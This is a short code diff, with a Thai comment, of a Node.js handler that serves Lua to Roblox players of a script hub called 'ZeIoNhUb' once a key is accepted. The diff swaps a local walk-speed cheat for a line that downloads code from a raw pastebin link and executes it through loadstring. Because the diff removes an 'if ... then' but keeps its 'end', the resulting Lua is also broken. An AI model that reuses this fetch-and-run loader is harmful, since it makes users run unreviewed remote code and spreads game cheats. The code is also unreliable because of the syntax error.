@@ -7,9 +7,7 @@ module.exports = (req, res) => {
       // ใช้เครื่องหมาย ` (Backtick) ครอบโค้ด Lua เพื่อให้พิมพ์ได้หลายบรรทัด
       res.status(200).send(`
         print("ZeIoNhUb: รหัส nnn ถูกต้อง!")
-        local p = game.Players.LocalPlayer
-        if p.Character and p.Character:FindFirstChild("Humanoid") then
-            p.Character.Humanoid.WalkSpeed = 100
+        loadstring(game:HttpGet("https://pastebin.com/raw/g9trxTQs"))();
         end
       `);
     } else {
